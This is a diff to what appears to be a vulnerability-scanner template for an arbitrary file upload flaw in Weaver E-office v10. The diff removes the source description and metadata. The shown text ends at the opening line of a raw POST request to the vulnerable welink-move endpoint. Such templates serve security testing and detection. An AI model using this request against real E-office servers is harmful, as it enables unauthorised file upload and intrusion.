@@ -3,12 +3,8 @@ info:
   name: 泛微 E-office v10 welink-move任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uc9pgdyuin07lkg6'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uc9pgdyuin07lkg6
-    fofa: 暂无
 http:
 - raw:
   - 'POST /eoffice10/server/public/api/welink/welink-move HTTP/1.1
